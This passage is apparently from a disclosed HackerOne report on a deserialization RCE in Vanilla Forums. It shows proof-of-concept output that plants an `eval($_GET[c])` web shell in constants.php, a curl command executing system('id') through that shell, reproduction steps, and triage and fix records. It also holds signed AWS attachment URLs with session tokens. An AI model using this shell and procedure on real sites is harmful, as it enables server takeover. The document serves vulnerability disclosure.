code directly\neven if we delete the .htaccess using the other potential pop chain.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThis contants.php file is included into the web root of the application, so we can execute the injected PHP code from the index page.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eThe config folder is naturally writable due to the caching in the same directory and that the code contantantly (pun intended) updates the config.php file.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eRemember to snapshot or backup your installation before running this exploit. It DOES NOT attempt to clean up after exploitation.\u003c/p\u003e\n\n\u003ch2 id=\"example\"\u003eExample:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003esaturn:~ mr_me$ ./poc.py \n(+) usage: poc.py \u0026lt;target\u0026gt; \u0026lt;cookie\u0026gt;\n(+) eg: poc.py 172.16.175.143 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1Mzg5NDk5OTIsImlhdCI6MTUzNjM1Nzk5Miwic3ViIjoyfQ.OoAIBcGiGKFPxGsfg_-9hFfohv0dO_CNqx1lK8YE7Kg\n\nsaturn:~ mr_me$ ./poc.py 172.16.175.143 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1Mzg5NDk5OTIsImlhdCI6MTUzNjM1Nzk5Miwic3ViIjoyfQ.OoAIBcGiGKFPxGsfg_-9hFfohv0dO_CNqx1lK8YE7Kg\n(+) targeting: http://172.16.175.143\n(+) shell injected into contants.php successfully!\n(+) shell at: http://172.16.175.143/?c=phpinfo();\n\nsaturn:~ mr_me$ curl -sSG \u0026quot;http://172.16.175.143/?c=system(\u0026#39;id\u0026#39;);\u0026quot; | cut -d \u0026quot;\u0026lt;\u0026quot; -f1\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow, on the target system:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003esteven\u003c/span\u003e\u003cspan class=\"o\"\u003e@\u003c/span\u003e\u003cspan class=\"nx\"\u003epluto\u003c/span\u003e\u003cspan class=\"o\"\u003e:/\u003c/span\u003e\u003cspan class=\"k\"\u003evar\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003ewww\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003ehtml\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003econf\u003c/span\u003e\u003cspan class=\"err\"\u003e$\u003c/span\u003e \u003cspan class=\"nx\"\u003ecat\u003c/span\u003e \u003cspan class=\"nx\"\u003econstants\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e \n\u003cspan class=\"o\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nb\"\u003edefined\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;APPLICATION\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"k\"\u003eexit\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$a\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003eeval\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ec\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\u003cspan class=\"c1\"\u003e//[\u0026#39;\u0026#39;] = \u0026#39;\u0026#39;;\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e// Last edited by admin (172.16.175.1)2018-09-08 20:35:19\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps to reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003eBackup your installation.\u003c/li\u003e\n\u003cli\u003eLogin as an admin and get the Vanilla cookie\u003c/li\u003e\n\u003cli\u003eRun the poc against your target with the cookie.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"anything-else-we-should-know\"\u003eAnything else we should know?\u003c/h2\u003e\n\n\u003cp\u003eGive me a few days and I\u0026#39;ll write you a patch. Basically you just need a \u003ccode\u003e__wakeUp\u003c/code\u003e call in the Gdn_Configuration class.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eHigh, RCE.\u003c/p\u003e\n","bounty_amount":"600.0","formatted_bounty":"$600","weakness":{"id":52,"name":"Deserialization of Untrusted Data"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":343923,"file_name":"Screen_Shot_2018-09-08_at_3.49.17_PM.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/343/923/e8dca2698d64c8f29ff27d252a80004bce0098ff/Screen_Shot_2018-09-08_at_3.49.17_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-09-08_at_3.49.17_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-09-08_at_3.49.17_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZNBK7XE3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055237Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDJ7z4CmMY3RV8XLMfdiTISQ9S1r9LCcJaOgCsH72FPNAiEAuja%2BBBclEzFTidjiCeJDfo4MzChKrB6582xpvIRZVHkqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDKF6a0ltLoRnSbls0yqRA3RGeXBNEYkcjQZeQFx3bgZwO3IO2Lrw6zpAqUNvB9kgtFfucTajkpiHPbxlEXUipMBgdqwocs7gTZt2N3PS5ofO0SiwdnSDzloAVKwvO0XxAw38SFZ70tsG2d%2FGMwjmhna0T8MpEDx2rGBrOrmMGD%2BxUltiSMg5RbP4rOtmNv8ar9c6C5QMOqO65NG11MRvC%2BWmpwVTu7rYIfx6VqNqNYuYBj3X8lrkAIj49fYyj6hO9J%2B192rAZcrZy%2Fw%2FVAObxfNeR4Ody9MGHCied9SDXd94Id6OVnLovmWuyeU9tqRxlCjsbK8JU%2BX4cPpzzLv2M%2BXo9FPZzDo%2BJsudoZ%2FGhP8gGO7tqmufjBlUJeCMc7PJwExjkANhZZ8jsuHUnG6x0ut5DHPqdKpuFrdIEEkM54WZUmpVWXhr4FFAQpHmxo5CDioZ8fJISU03lWiVZsNHNUNL9JvOP%2F9r%2BD39N6cKvQsPj88OjMOdSwqmXok7EmQpEHjQJD7E2qU3u9NYOegEnJbeEDovuNzvrAFxWCR8Jb54MPSEq%2F8FOusBO2kLVSIwkWtiWhkMaF2Er8oC8IS3vbK0bWd1vKM6%2B7NbNWRuqTnvJZaJWfp3F9jcm3FnwzYHZTcGXifg17Nbzb0roUgfsHPeorCwFQWH5sgSgHT2%2FWJtKCiy%2Bq70tsC4rbZb9rhONxp4U1mUQ1FHptDEi7qq4G0IX8as4zxX7lD6kdQWT5OzW%2B1QZT5nCSKbiYjBuLsBWu7yufMUkemOm2u4kDIOdccYg1ZGDofBPx4GFA%2B8IOAMP3e7bz6rUgxMr2NMjzX%2Byr%2FFaK2EDYbEgcI81le58BokeFu68wlopZbfnJvFia1ReCQe1Q%3D%3D\u0026X-Amz-Signature=d0368a541aff89b79af5ce61c4cb94f3894992968bb2bf1bd7e6b767f66216bd","file_size":255995,"type":"image/png"},{"id":343924,"file_name":"poc.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/343/924/9fba8618a0bcc4d7ec1be3be30d210fd6efa4caf/poc.py?response-content-disposition=attachment%3B%20filename%3D%22poc.py%22%3B%20filename%2A%3DUTF-8%27%27poc.py\u0026response-content-type=text%2Fx-python\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZNBK7XE3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055237Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDJ7z4CmMY3RV8XLMfdiTISQ9S1r9LCcJaOgCsH72FPNAiEAuja%2BBBclEzFTidjiCeJDfo4MzChKrB6582xpvIRZVHkqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDKF6a0ltLoRnSbls0yqRA3RGeXBNEYkcjQZeQFx3bgZwO3IO2Lrw6zpAqUNvB9kgtFfucTajkpiHPbxlEXUipMBgdqwocs7gTZt2N3PS5ofO0SiwdnSDzloAVKwvO0XxAw38SFZ70tsG2d%2FGMwjmhna0T8MpEDx2rGBrOrmMGD%2BxUltiSMg5RbP4rOtmNv8ar9c6C5QMOqO65NG11MRvC%2BWmpwVTu7rYIfx6VqNqNYuYBj3X8lrkAIj49fYyj6hO9J%2B192rAZcrZy%2Fw%2FVAObxfNeR4Ody9MGHCied9SDXd94Id6OVnLovmWuyeU9tqRxlCjsbK8JU%2BX4cPpzzLv2M%2BXo9FPZzDo%2BJsudoZ%2FGhP8gGO7tqmufjBlUJeCMc7PJwExjkANhZZ8jsuHUnG6x0ut5DHPqdKpuFrdIEEkM54WZUmpVWXhr4FFAQpHmxo5CDioZ8fJISU03lWiVZsNHNUNL9JvOP%2F9r%2BD39N6cKvQsPj88OjMOdSwqmXok7EmQpEHjQJD7E2qU3u9NYOegEnJbeEDovuNzvrAFxWCR8Jb54MPSEq%2F8FOusBO2kLVSIwkWtiWhkMaF2Er8oC8IS3vbK0bWd1vKM6%2B7NbNWRuqTnvJZaJWfp3F9jcm3FnwzYHZTcGXifg17Nbzb0roUgfsHPeorCwFQWH5sgSgHT2%2FWJtKCiy%2Bq70tsC4rbZb9rhONxp4U1mUQ1FHptDEi7qq4G0IX8as4zxX7lD6kdQWT5OzW%2B1QZT5nCSKbiYjBuLsBWu7yufMUkemOm2u4kDIOdccYg1ZGDofBPx4GFA%2B8IOAMP3e7bz6rUgxMr2NMjzX%2Byr%2FFaK2EDYbEgcI81le58BokeFu68wlopZbfnJvFia1ReCQe1Q%3D%3D\u0026X-Amz-Signature=b8b33957176b9e9782dff4ddcbd836761d5bd1b0674bdb7475ebcebf7867ab4e","file_size":17982,"type":"text/x-python"}],"allow_singular_disclosure_at":"2018-11-23T15:47:07.080Z","allow_singular_disclosure_after":-66233130.10085288,"singular_disclosure_allowed":true,"vote_count":23,"voters":["irek","inhibitor181","spam404","sameerphad72","ahiezer","mygf","eveeez","sasi2103","khizer47","cyberunit","and 13 more..."],"severity":{"rating":"critical","score":9.1,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"high","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":2101,"asset_type":"URL","asset_identifier":"*.vanillaforums.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3311550,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Reproducible: Yes, please see poc.py\nImpact: High, RCE\nIn Scope: Yes","markdown_message":"\u003cp\u003eReproducible: Yes, please see poc.py\u003cbr\u003e\nImpact: High, RCE\u003cbr\u003e\nIn Scope: Yes\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-08T21:58:22.899Z","updated_at":"2018-09-08T21:58:22.899Z","actor":{"username":"mr_me","cleared":false,"url":"/mr_me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3312890,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry, I made a few typos because I posted it between flights. But if your confused with anything, just let me know and I’ll update the report.","markdown_message":"\u003cp\u003eSorry, I made a few typos because I posted it between flights. But if your confused with anything, just let me know and I’ll update the report.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-09T08:57:06.260Z","updated_at":"2018-09-09T08:57:06.260Z","actor":{"username":"mr_me","cleared":false,"url":"/mr_me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3313528,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi there mr_me, We will look into this tomorrow, and give you a feedback accordingly.\nThank you.","markdown_message":"\u003cp\u003eHi there mr_me, We will look into this tomorrow, and give you a feedback accordingly.\u003cbr\u003e\nThank you.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-09T17:00:12.596Z","updated_at":"2018-09-09T17:00:12.596Z","actor":{"username":"dexterr","cleared":false,"url":"/dexterr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/201/11a7da9d5256f50a86acdf6a8f3366252baee73e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3333110,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-13T15:54:07.882Z","updated_at":"2018-09-13T15:54:07.882Z","additional_data":{"old_severity":"High (8.8)","new_severity":"Critical (9.9)","old_severity_id":207758,"new_severity_id":209734},"actor":{"username":"linc","cleared":false,"url":"/linc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3333118,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-13T15:55:10.328Z","updated_at":"2018-09-13T15:55:10.328Z","additional_data":{"old_severity":"Critical (9.9)","new_severity":"Critical (9.9)","old_severity_id":209734,"new_severity_id":209737},"actor":{"username":"topcheese","cleared":false,"url":"/topcheese","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/288/788/a6ffb251430857512543714c4f055c5c27023935_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3333796,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also, here is the pop chain in its native form.","markdown_message":"\u003cp\u003eAlso, here is the pop chain in its native form.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-13T18:55:25.727Z","updated_at":"2018-09-13T18:55:25.727Z","actor":{"username":"mr_me","cleared":false,"url":"/mr_me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":345954,"filename":"pop.php","type":"text/x-php","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/345/954/130dbb916925e0a41d906fe28c9707898f3980fb/pop.php?response-content-disposition=attachment%3B%20filename%3D%22pop.php%22%3B%20filename%2A%3DUTF-8%27%27pop.php\u0026response-content-type=text%2Fx-php\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQZNBK7XE3%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T055237Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDJ7z4CmMY3RV8XLMfdiTISQ9S1r9LCcJaOgCsH72FPNAiEAuja%2BBBclEzFTidjiCeJDfo4MzChKrB6582xpvIRZVHkqtAMIVxABGgwwMTM2MTkyNzQ4NDkiDKF6a0ltLoRnSbls0yqRA3RGeXBNEYkcjQZeQFx3bgZwO3IO2Lrw6zpAqUNvB9kgtFfucTajkpiHPbxlEXUipMBgdqwocs7gTZt2N3PS5ofO0SiwdnSDzloAVKwvO0XxAw38SFZ70tsG2d%2FGMwjmhna0T8MpEDx2rGBrOrmMGD%2BxUltiSMg5RbP4rOtmNv8ar9c6C5QMOqO65NG11MRvC%2BWmpwVTu7rYIfx6VqNqNYuYBj3X8lrkAIj49fYyj6hO9J%2B192rAZcrZy%2Fw%2FVAObxfNeR4Ody9MGHCied9SDXd94Id6OVnLovmWuyeU9tqRxlCjsbK8JU%2BX4cPpzzLv2M%2BXo9FPZzDo%2BJsudoZ%2FGhP8gGO7tqmufjBlUJeCMc7PJwExjkANhZZ8jsuHUnG6x0ut5DHPqdKpuFrdIEEkM54WZUmpVWXhr4FFAQpHmxo5CDioZ8fJISU03lWiVZsNHNUNL9JvOP%2F9r%2BD39N6cKvQsPj88OjMOdSwqmXok7EmQpEHjQJD7E2qU3u9NYOegEnJbeEDovuNzvrAFxWCR8Jb54MPSEq%2F8FOusBO2kLVSIwkWtiWhkMaF2Er8oC8IS3vbK0bWd1vKM6%2B7NbNWRuqTnvJZaJWfp3F9jcm3FnwzYHZTcGXifg17Nbzb0roUgfsHPeorCwFQWH5sgSgHT2%2FWJtKCiy%2Bq70tsC4rbZb9rhONxp4U1mUQ1FHptDEi7qq4G0IX8as4zxX7lD6kdQWT5OzW%2B1QZT5nCSKbiYjBuLsBWu7yufMUkemOm2u4kDIOdccYg1ZGDofBPx4GFA%2B8IOAMP3e7bz6rUgxMr2NMjzX%2Byr%2FFaK2EDYbEgcI81le58BokeFu68wlopZbfnJvFia1ReCQe1Q%3D%3D\u0026X-Amz-Signature=92c9b89b42f403c41d3b8b7930924a9aa97a10569dfbb8a6a581a0796d21ad09"}],"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3333982,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-13T19:45:48.556Z","updated_at":"2018-09-13T19:45:48.556Z","actor":{"username":"topcheese","cleared":false,"url":"/topcheese","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/288/788/a6ffb251430857512543714c4f055c5c27023935_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3337974,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-14T13:59:29.411Z","updated_at":"2018-09-14T13:59:29.411Z","additional_data":{"old_severity":"Critical (9.9)","new_severity":"Critical (9.1)","old_severity_id":209737,"new_severity_id":210131},"actor":{"username":"tburry","cleared":false,"url":"/tburry","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/190/499/3a293de3bd6e5bafafc57dd7c4bb58ad21f47975_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3358073,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-09-19T12:27:11.275Z","updated_at":"2018-09-19T12:27:11.275Z","actor":{"url":"/vanilla","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Vanilla"}},"bounty_amount":"600.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"vanilla","collaborator":{"username":"mr_me","url":"/mr_me"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3358407,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks!","markdown_message":"\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-19T13:45:02.489Z","updated_at":"2018-09-19T13:45:02.489Z","actor":{"username":"mr_me","cleared":false,"url":"/mr_me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3376859,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Shipped in 2.6.2, 2.5.5, upcoming 2.7, and previously to cloud.","markdown_message":"\u003cp\u003eShipped in 2.6.2, 2.5.5, upcoming 2.7, and previously to cloud.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-09-23T23:39:31.457Z","updated_at":"2018-09-23T23:39:31.457Z","actor":{"username":"linc","cleared":false,"url":"/linc","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/136/045/6328894ce30b4f6b0e176d2a721ce5ea9849d135_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"mr_me","url":"/mr_me"},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3527259,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-10-24T15:47:07.052Z","updated_at":"2018-10-24T15:47:07.052Z","first_to_agree":true,"actor":{"username":"mr_me","cleared":false,"url":"/mr_me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3701314,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-11-23T15:47:15.423Z","updated_at":"2018-11-23T15:47:15.423Z","actor":{"url":"/vanilla","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Vanilla"}},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3710706,"is_internal":false,"editable":false,"type":"Activities::Comment","message":" CVE-2018-19499","markdown_message":"\u003cp\u003eCVE-2018-19499\u003c/p\u003e\n","automated_response":false,"created_at":"2018-11-26T17:39:45.809Z","updated_at":"2018-11-26T17:39:45.809Z","actor":{"username":"mr_me","cleared":false,"url":"/mr_me","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vanilla","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":10346,"category":"researcher","content":"An authenticated admin user can trigger a call to unserialize() which can allow an attacker to gain remote code execution leveraging a custom pop chain.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eAn authenticated admin user can trigger a call to unserialize() which can allow an attacker to gain remote code execution leveraging a custom pop chain.\u003c/p\u003e\n"}]}